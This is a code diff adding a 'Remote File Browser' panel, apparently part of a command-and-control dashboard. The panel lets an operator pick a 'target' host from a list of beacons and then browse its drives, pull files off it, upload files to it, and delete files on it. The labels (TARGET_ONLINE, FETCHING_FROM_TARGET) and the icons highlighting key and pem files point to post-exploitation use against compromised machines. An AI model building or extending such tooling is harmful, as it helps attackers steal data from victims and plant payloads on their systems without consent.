@@ -1,0 +1,514 @@
+<div class="section-header" style="display: flex; justify-content: space-between; align-items: center; flex-wrap:wrap; gap:10px;">
+    <h3>Remote File Browser</h3>
+    <div style="display:flex; gap:10px; align-items:center; flex-wrap:wrap;">
+        <select class="form-input" id="rfm-client" style="width:240px; height:32px; font-size:11px;" onchange="rfmOnClientChange()">
+            <option value="">SELECT_TARGET...</option>
+        </select>
+        <span id="rfm-status" style="font-family:'JetBrains Mono'; font-size:10px; color:#666;">NO_TARGET</span>
+    </div>
+</div>
+
+<!-- Toolbar -->
+<div id="rfm-toolbar" style="display:none; gap:10px; align-items:center; margin-bottom:15px; flex-wrap:wrap;">
+    <div style="flex:1; display:flex; align-items:center; gap:8px;">
+        <button class="btn-primary" style="padding:6px 12px; font-size:11px;" onclick="rfmGoUp()" title="Up">
+            <i class="fas fa-level-up-alt"></i>
+        </button>
+        <button class="btn-primary" style="padding:6px 12px; font-size:11px;" onclick="rfmGoToDrives()" title="Drives / Root">
+            <i class="fas fa-hdd"></i>
+        </button>
+        <input type="text" class="form-input" id="rfm-path-input" placeholder="Enter path..." style="flex:1; height:30px; font-size:11px; font-family:'JetBrains Mono',monospace; color:var(--accent);" onkeydown="if(event.key==='Enter')rfmGoToPath()">
+        <button class="btn-primary" style="padding:6px 12px; font-size:11px;" onclick="rfmGoToPath()" title="Go">
+            <i class="fas fa-arrow-right"></i> GO
+        </button>
+        <button class="btn-primary" style="padding:6px 12px; font-size:11px;" onclick="rfmRefresh()" title="Refresh">
+            <i class="fas fa-sync-alt"></i>
+        </button>
+    </div>
+    <div style="display:flex; gap:8px;">
+        <button class="btn-primary" style="padding:6px 12px; font-size:11px;" onclick="rfmShowMkdir()">
+            <i class="fas fa-folder-plus"></i> MKDIR
+        </button>
+        <label class="btn-primary" style="padding:6px 12px; font-size:11px; cursor:pointer; display:inline-flex; align-items:center; gap:5px;">
+            <i class="fas fa-cloud-upload-alt"></i> UPLOAD
+            <input type="file" id="rfm-upload-input" style="display:none;" onchange="rfmUploadFiles(this.files)">
+        </label>
+    </div>
+</div>
+
+<!-- Mkdir dialog -->
+<div id="rfm-mkdir-dialog" style="display:none; margin-bottom:15px; padding:12px; background:rgba(26,26,26,0.6); border:1px solid var(--border);">
+    <div style="display:flex; gap:10px; align-items:center;">
+        <input type="text" class="form-input" id="rfm-mkdir-name" placeholder="New folder name" style="flex:1; height:32px; font-size:12px;">
+        <button class="btn-primary" style="padding:6px 14px; font-size:11px;" onclick="rfmCreateDir()">CREATE</button>
+        <button class="btn-primary" style="padding:6px 14px; font-size:11px; opacity:0.5;" onclick="document.getElementById('rfm-mkdir-dialog').style.display='none'">CANCEL</button>
+    </div>
+</div>
+
+<!-- Progress area -->
+<div id="rfm-progress" style="display:none; margin-bottom:15px;"></div>
+
+<!-- File listing -->
+<div id="rfm-list-wrapper" style="display:none;">
+    <div class="list-container" style="overflow-x:auto;">
+        <div class="beacons-header-bar" style="grid-template-columns: 40px 1fr 100px 140px 80px; min-width:500px;">
+            <span></span>
+            <span>Name</span>
+            <span>Size</span>
+            <span>Modified</span>
+            <span style="text-align:right;">Actions</span>
+        </div>
+        <div id="rfm-file-list" style="max-height: calc(100vh - 420px); overflow-y:auto;">
+            <div style="padding:30px; text-align:center; opacity:0.3; font-family:'JetBrains Mono';">SELECT_TARGET_FIRST</div>
+        </div>
+    </div>
+</div>
+
+<!-- No target placeholder -->
+<div id="rfm-placeholder" style="display:flex; align-items:center; justify-content:center; min-height:300px;">
+    <div style="text-align:center; opacity:0.3;">
+        <i class="fas fa-crosshairs" style="font-size:48px; color:var(--accent); margin-bottom:15px;"></i>
+        <div style="font-family:'JetBrains Mono'; font-size:13px;">SELECT_TARGET_TO_BROWSE_FILES</div>
+    </div>
+</div>
+
+<script>
+(function() {
+    let currentClientId = '';
+    let currentPath = '.';
+
+    function formatSize(bytes) {
+        if (!bytes || bytes === 0) return '-';
+        if (bytes < 1024) return bytes + ' B';
+        if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
+        if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
+        return (bytes / (1024 * 1024 * 1024)).toFixed(2) + ' GB';
+    }
+
+    function formatTime(t) {
+        if (!t) return '-';
+        return new Date(t).toLocaleString();
+    }
+
+    function getFileIcon(name, isDir) {
+        if (isDir) return 'fa-folder" style="color:#f5a623;';
+        const ext = name.split('.').pop().toLowerCase();
+        const icons = {
+            'exe': 'fa-cog" style="color:#ff3b30;', 'elf': 'fa-cog" style="color:#ff3b30;',
+            'dll': 'fa-puzzle-piece" style="color:#ff9800;', 'so': 'fa-puzzle-piece" style="color:#ff9800;',
+            'ps1': 'fa-terminal" style="color:#0078d4;', 'py': 'fa-code" style="color:#3572A5;',
+            'sh': 'fa-scroll" style="color:#4EAA25;', 'bat': 'fa-terminal" style="color:#888;',
+            'bin': 'fa-microchip" style="color:#9c27b0;', 'raw': 'fa-file-code" style="color:#9c27b0;',
+            'zip': 'fa-file-archive" style="color:#ff9800;', 'tar': 'fa-file-archive" style="color:#ff9800;',
+            'gz': 'fa-file-archive" style="color:#ff9800;', '7z': 'fa-file-archive" style="color:#ff9800;',
+            'txt': 'fa-file-alt" style="color:#888;', 'log': 'fa-file-alt" style="color:#888;',
+            'json': 'fa-file-code" style="color:#888;', 'xml': 'fa-file-code" style="color:#888;',
+            'png': 'fa-file-image" style="color:#2196F3;', 'jpg': 'fa-file-image" style="color:#2196F3;',
+            'pdf': 'fa-file-pdf" style="color:#ff3b30;',
+            'doc': 'fa-file-word" style="color:#2b579a;', 'docx': 'fa-file-word" style="color:#2b579a;',
+            'xls': 'fa-file-excel" style="color:#217346;', 'xlsx': 'fa-file-excel" style="color:#217346;',
+            'db': 'fa-database" style="color:#888;', 'sqlite': 'fa-database" style="color:#888;',
+            'key': 'fa-key" style="color:#f5a623;', 'pem': 'fa-key" style="color:#f5a623;',
+            'conf': 'fa-cogs" style="color:#888;', 'cfg': 'fa-cogs" style="color:#888;',
+            'ini': 'fa-cogs" style="color:#888;',
+        };
+        return icons[ext] || 'fa-file" style="color:#666;';
+    }
+
+    // Load online clients
+    async function loadClients() {
+        try {
+            const resp = await fetch('/api/clients', { headers: { 'X-Requested-With': 'XMLHttpRequest' } });
+            const result = await resp.json();
+            const sel = document.getElementById('rfm-client');
+            if (!sel || !result.data) return;
+            const clients = result.data;
+            sel.innerHTML = '<option value="">SELECT_TARGET...</option>' +
+                clients.map(c => {
+                    const status = c.status === 'online' ? '\u25CF' : '\u25CB';
+                    return '<option value="' + c.id + '" data-status="' + c.status + '">' +
+                        status + ' ' + (c.hostname || c.id.substring(0, 8)) +
+                        ' (' + c.ip + ') [' + (c.os || '?') + ']</option>';
+                }).join('');
+        } catch(e) { console.error(e); }
+    }
+
+    window.rfmOnClientChange = function() {
+        const sel = document.getElementById('rfm-client');
+        currentClientId = sel.value;
+        const statusEl = document.getElementById('rfm-status');
+        const toolbar = document.getElementById('rfm-toolbar');
+        const listWrapper = document.getElementById('rfm-list-wrapper');
+        const placeholder = document.getElementById('rfm-placeholder');
+
+        if (!currentClientId) {
+            statusEl.textContent = 'NO_TARGET';
+            statusEl.style.color = '#666';
+            toolbar.style.display = 'none';
+            listWrapper.style.display = 'none';
+            placeholder.style.display = 'flex';
+            return;
+        }
+
+        const opt = sel.selectedOptions[0];
+        const isOnline = opt && opt.getAttribute('data-status') === 'online';
+        statusEl.textContent = isOnline ? 'TARGET_ONLINE' : 'TARGET_OFFLINE';
+        statusEl.style.color = isOnline ? '#4caf50' : '#ff3b30';
+
+        toolbar.style.display = 'flex';
+        listWrapper.style.display = 'block';
+        placeholder.style.display = 'none';
+
+        currentPath = '.';
+        rfmNavigate(currentPath);
+    };
+
+    function updatePathInput(path) {
+        const input = document.getElementById('rfm-path-input');
+        if (input) input.value = path;
+    }
+
+    // Detect if path is a Windows drive root like "C:\" or "__DRIVES__"
+    function isWindowsDriveRoot(p) {
+        return /^[A-Za-z]:\\?$/.test(p);
+    }
+
+    window.rfmNavigate = async function(path) {
+        if (!currentClientId) return;
+        currentPath = path || '.';
+
+        const container = document.getElementById('rfm-file-list');
+        container.innerHTML = '<div style="padding:30px; text-align:center; opacity:0.5; font-family:\'JetBrains Mono\'; font-size:11px;"><i class="fas fa-spinner fa-spin" style="margin-right:8px;"></i>QUERYING_TARGET...</div>';
+
+        try {
+            const resp = await fetch('/api/rfm/list?client_id=' + encodeURIComponent(currentClientId) + '&path=' + encodeURIComponent(currentPath), {
+                headers: { 'X-Requested-With': 'XMLHttpRequest' }
+            });
+            const result = await resp.json();
+            if (result.status !== 'success') {
+                container.innerHTML = '<div style="padding:30px; text-align:center; color:#ff3b30; font-family:\'JetBrains Mono\'; font-size:11px;">ERROR: ' + (result.message || 'unknown') + '</div>';
+                return;
+            }
+
+            currentPath = result.data.path || currentPath;
+            updatePathInput(currentPath);
+
+            if (currentPath === '__DRIVES__') {
+                renderDriveList(result.data.items || []);
+            } else {
+                renderFileList(result.data.items || []);
+            }
+        } catch(e) {
+            container.innerHTML = '<div style="padding:30px; text-align:center; color:#ff3b30; font-family:\'JetBrains Mono\'; font-size:11px;">ERROR: ' + e.message + '</div>';
+        }
+    };
+
+    window.rfmGoUp = function() {
+        // If at drives list, do nothing
+        if (currentPath === '__DRIVES__') return;
+
+        let parent = currentPath;
+        const sep = currentPath.includes('\\') ? '\\' : '/';
+
+        // Remove trailing separator
+        if (parent.endsWith(sep) && parent.length > 1) parent = parent.slice(0, -1);
+
+        // Check if at drive root (like "C:" or "C:\")
+        if (/^[A-Za-z]:$/.test(parent) || /^[A-Za-z]:\\$/.test(parent)) {
+            // Go to drives list
+            rfmNavigate('__DRIVES__');
+            return;
+        }
+
+        // Check if at Unix root
+        if (parent === '/') return;
+
+        const lastSep = parent.lastIndexOf(sep);
+        if (lastSep > 0) {
+            parent = parent.substring(0, lastSep);
+            // If we chopped down to just "C:", add backslash for Windows
+            if (/^[A-Za-z]:$/.test(parent)) parent += '\\';
+        } else if (lastSep === 0) {
+            parent = '/';
+        } else {
+            parent = '.';
+        }
+        rfmNavigate(parent);
+    };
+
+    window.rfmGoToDrives = function() {
+        rfmNavigate('__DRIVES__');
+    };
+
+    window.rfmGoToPath = function() {
+        const input = document.getElementById('rfm-path-input');
+        const path = input.value.trim();
+        if (!path) return;
+        rfmNavigate(path);
+    };
+
+    window.rfmRefresh = function() {
+        rfmNavigate(currentPath);
+    };
+
+    function escapeHtml(s) {
+        return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+    }
+
+    function renderDriveList(items) {
+        const container = document.getElementById('rfm-file-list');
+        if (!container) return;
+
+        if (items.length === 0) {
+            container.innerHTML = '<div style="padding:30px; text-align:center; opacity:0.3; font-family:\'JetBrains Mono\';">NO_DRIVES_FOUND</div>';
+            return;
+        }
+
+        container.innerHTML = items.map(item => {
+            const drivePath = item.name + '\\';
+            const safePath = escapeHtml(drivePath).replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+            return '<div class="beacon-row" style="grid-template-columns: 40px 1fr 100px 140px 80px; padding:8px 20px; min-width:500px;">' +
+                '<span><i class="fas fa-hdd" style="color:var(--accent);"></i></span>' +
+                '<span onclick="rfmNavigate(\'' + safePath + '\')" style="cursor:pointer; color:var(--accent); font-family:\'JetBrains Mono\'; font-size:13px; font-weight:bold;">' + escapeHtml(item.name) + ':\\</span>' +
+                '<span style="font-size:11px; color:#888; font-family:\'JetBrains Mono\';">Drive</span>' +
+                '<span style="font-size:10px; color:#666;">-</span>' +
+                '<span></span>' +
+            '</div>';
+        }).join('');
+    }
+
+    function renderFileList(items) {
+        const container = document.getElementById('rfm-file-list');
+        if (!container) return;
+
+        if (items.length === 0) {
+            container.innerHTML = '<div style="padding:30px; text-align:center; opacity:0.3; font-family:\'JetBrains Mono\';">EMPTY_DIRECTORY</div>';
+            return;
+        }
+
+        // Sort: dirs first, then by name
+        items.sort((a, b) => {
+            if (a.is_dir && !b.is_dir) return -1;
+            if (!a.is_dir && b.is_dir) return 1;
+            return a.name.localeCompare(b.name);
+        });
+
+        container.innerHTML = items.map(item => {
+            const icon = getFileIcon(item.name, item.is_dir);
+            const sep = currentPath.includes('\\') ? '\\' : '/';
+            let fullPath = currentPath;
+            if (!fullPath.endsWith(sep) && !fullPath.endsWith('/')) fullPath += sep;
+            fullPath += item.name;
+            const safePath = escapeHtml(fullPath).replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+
+            const nameClick = item.is_dir
+                ? 'onclick="rfmNavigate(\'' + safePath + '\')" style="cursor:pointer; color:var(--accent);"'
+                : 'style="color:var(--text-main);"';
+
+            return '<div class="beacon-row" style="grid-template-columns: 40px 1fr 100px 140px 80px; padding:8px 20px; min-width:500px;">' +
+                '<span><i class="fas ' + icon + '"></i></span>' +
+                '<span ' + nameClick + '>' + escapeHtml(item.name) + '</span>' +
+                '<span style="font-size:11px; color:#888; font-family:\'JetBrains Mono\';">' + (item.is_dir ? '-' : formatSize(item.size)) + '</span>' +
+                '<span style="font-size:10px; color:#666;">' + formatTime(item.mod_time) + '</span>' +
+                '<span style="text-align:right; display:flex; gap:10px; justify-content:flex-end; font-size:11px;">' +
+                    (!item.is_dir ? '<span style="color:var(--accent); cursor:pointer;" onclick="rfmDownloadFile(\'' + safePath + '\')" title="Download"><i class="fas fa-download"></i></span>' : '') +
+                    '<span style="color:#ff3b30; cursor:pointer;" onclick="rfmDeleteItem(\'' + safePath + '\')" title="Delete"><i class="fas fa-trash"></i></span>' +
+                '</span>' +
+            '</div>';
+        }).join('');
+    }
+
+    // --- Mkdir ---
+    window.rfmShowMkdir = function() {
+        document.getElementById('rfm-mkdir-dialog').style.display = 'block';
+        document.getElementById('rfm-mkdir-name').value = '';
+        document.getElementById('rfm-mkdir-name').focus();
+    };
+
+    window.rfmCreateDir = async function() {
+        const name = document.getElementById('rfm-mkdir-name').value.trim();
+        if (!name || !currentClientId) return;
+
+        const sep = currentPath.includes('\\') ? '\\' : '/';
+        let newPath = currentPath;
+        if (!newPath.endsWith(sep) && !newPath.endsWith('/')) newPath += sep;
+        newPath += name;
+
+        try {
+            const resp = await fetch('/api/rfm/mkdir', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
+                body: JSON.stringify({ client_id: currentClientId, path: newPath })
+            });
+            const result = await resp.json();
+            if (result.status === 'success') {
+                showNotification('DIRECTORY_CREATED: ' + name);
+            } else {
+                showNotification('ERROR: ' + result.message);
+            }
+            document.getElementById('rfm-mkdir-dialog').style.display = 'none';
+            rfmRefresh();
+        } catch(e) { showNotification('ERROR: ' + e.message); }
+    };
+
+    // --- Delete ---
+    window.rfmDeleteItem = async function(path) {
+        if (!confirm('Delete on remote target: ' + path + '?')) return;
+        try {
+            const resp = await fetch('/api/rfm/delete', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
+                body: JSON.stringify({ client_id: currentClientId, path: path })
+            });
+            const result = await resp.json();
+            showNotification(result.status === 'success' ? 'DELETED' : ('ERROR: ' + result.message));
+            rfmRefresh();
+        } catch(e) { showNotification('ERROR: ' + e.message); }
+    };
+
+    // --- Download ---
+    window.rfmDownloadFile = async function(path) {
+        const progressArea = document.getElementById('rfm-progress');
+        progressArea.style.display = 'block';
+        const fileName = path.split(/[/\\]/).pop();
+
+        const progId = 'rdl_' + Date.now();
+        const progEl = document.createElement('div');
+        progEl.style.cssText = 'padding:10px 14px; background:rgba(26,26,26,0.6); border:1px solid var(--border); margin-bottom:8px;';
+        progEl.innerHTML =
+            '<div style="display:flex; justify-content:space-between; margin-bottom:6px;">' +
+                '<span style="font-family:\'JetBrains Mono\'; font-size:11px; color:var(--accent);"><i class="fas fa-cloud-download-alt" style="margin-right:6px;"></i>' + escapeHtml(fileName) + '</span>' +
+                '<span style="font-family:\'JetBrains Mono\'; font-size:10px; color:#888;" id="' + progId + '-status">FETCHING_FROM_TARGET...</span>' +
+            '</div>' +
+            '<div style="height:3px; background:rgba(255,255,255,0.05);"><div id="' + progId + '-bar" style="height:100%; width:0%; background:#2196F3; box-shadow:0 0 8px #2196F3; transition:width 0.3s;"></div></div>';
+        progressArea.appendChild(progEl);
+
+        try {
+            const statusEl = document.getElementById(progId + '-status');
+            const barEl = document.getElementById(progId + '-bar');
+            barEl.style.width = '30%';
+
+            const resp = await fetch('/api/rfm/download?client_id=' + encodeURIComponent(currentClientId) + '&path=' + encodeURIComponent(path), {
+                headers: { 'X-Requested-With': 'XMLHttpRequest' }
+            });
+            const result = await resp.json();
+
+            if (result.status !== 'success') {
+                throw new Error(result.message || 'download failed');
+            }
+
+            barEl.style.width = '80%';
+            statusEl.textContent = 'DECODING...';
+
+            const b64 = result.data.base64;
+            const raw = atob(b64);
+            const bytes = new Uint8Array(raw.length);
+            for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);
+            const blob = new Blob([bytes]);
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = fileName;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+
+            barEl.style.width = '100%';
+            barEl.style.background = 'var(--success)';
+            statusEl.textContent = 'COMPLETE (' + formatSize(result.data.size) + ')';
+            statusEl.style.color = 'var(--success)';
+            showNotification('DOWNLOAD_COMPLETE: ' + fileName);
+            setTimeout(() => { if (progEl.parentNode) progEl.parentNode.removeChild(progEl); }, 4000);
+
+        } catch(e) {
+            const statusEl = document.getElementById(progId + '-status');
+            if (statusEl) { statusEl.textContent = 'FAILED: ' + e.message; statusEl.style.color = '#ff3b30'; }
+            showNotification('DOWNLOAD_FAILED: ' + e.message);
+        }
+    };
+
+    // --- Upload ---
+    window.rfmUploadFiles = async function(files) {
+        if (!files || files.length === 0 || !currentClientId) return;
+        const progressArea = document.getElementById('rfm-progress');
+        progressArea.style.display = 'block';
+
+        for (const file of files) {
+            await rfmUploadSingle(file, progressArea);
+        }
+
+        document.getElementById('rfm-upload-input').value = '';
+        rfmRefresh();
+    };
+
+    async function rfmUploadSingle(file, progressArea) {
+        if (file.size > 50 * 1024 * 1024) {
+            showNotification('ERROR: File too large (>50MB): ' + file.name);
+            return;
+        }
+
+        const progId = 'rup_' + Date.now();
+        const progEl = document.createElement('div');
+        progEl.style.cssText = 'padding:10px 14px; background:rgba(26,26,26,0.6); border:1px solid var(--border); margin-bottom:8px;';
+        progEl.innerHTML =
+            '<div style="display:flex; justify-content:space-between; margin-bottom:6px;">' +
+                '<span style="font-family:\'JetBrains Mono\'; font-size:11px; color:var(--accent);"><i class="fas fa-cloud-upload-alt" style="margin-right:6px;"></i>' + escapeHtml(file.name) + '</span>' +
+                '<span style="font-family:\'JetBrains Mono\'; font-size:10px; color:#888;" id="' + progId + '-status">ENCODING...</span>' +
+            '</div>' +
+            '<div style="height:3px; background:rgba(255,255,255,0.05);"><div id="' + progId + '-bar" style="height:100%; width:0%; background:var(--accent); box-shadow:0 0 8px var(--accent); transition:width 0.3s;"></div></div>' +
+            '<div style="margin-top:4px; font-family:\'JetBrains Mono\'; font-size:9px; color:#555;">' + formatSize(file.size) + '</div>';
+        progressArea.appendChild(progEl);
+
+        try {
+            const statusEl = document.getElementById(progId + '-status');
+            const barEl = document.getElementById(progId + '-bar');
+
+            const b64 = await new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = () => resolve(reader.result.split(',')[1]);
+                reader.onerror = reject;
+                reader.readAsDataURL(file);
+            });
+
+            barEl.style.width = '40%';
+            statusEl.textContent = 'UPLOADING_TO_TARGET...';
+
+            const sep = currentPath.includes('\\') ? '\\' : '/';
+            let destPath = currentPath;
+            if (!destPath.endsWith(sep) && !destPath.endsWith('/')) destPath += sep;
+            destPath += file.name;
+
+            const resp = await fetch('/api/rfm/upload', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
+                body: JSON.stringify({ client_id: currentClientId, path: destPath, data: b64 })
+            });
+            const result = await resp.json();
+
+            if (result.status !== 'success') throw new Error(result.message);
+
+            barEl.style.width = '100%';
+            barEl.style.background = 'var(--success)';
+            statusEl.textContent = 'COMPLETE';
+            statusEl.style.color = 'var(--success)';
+            showNotification('UPLOAD_COMPLETE: ' + file.name);
+            setTimeout(() => { if (progEl.parentNode) progEl.parentNode.removeChild(progEl); }, 4000);
+
+        } catch(e) {
+            const statusEl = document.getElementById(progId + '-status');
+            if (statusEl) { statusEl.textContent = 'FAILED: ' + e.message; statusEl.style.color = '#ff3b30'; }
+            showNotification('UPLOAD_FAILED: ' + e.message);
+        }
+    }
+
+    // Enter key for mkdir
+    document.getElementById('rfm-mkdir-name').addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') rfmCreateDir();
+        if (e.key === 'Escape') document.getElementById('rfm-mkdir-dialog').style.display = 'none';
+    });
+
+    // Init
+    loadClients();
+})();
+</script>
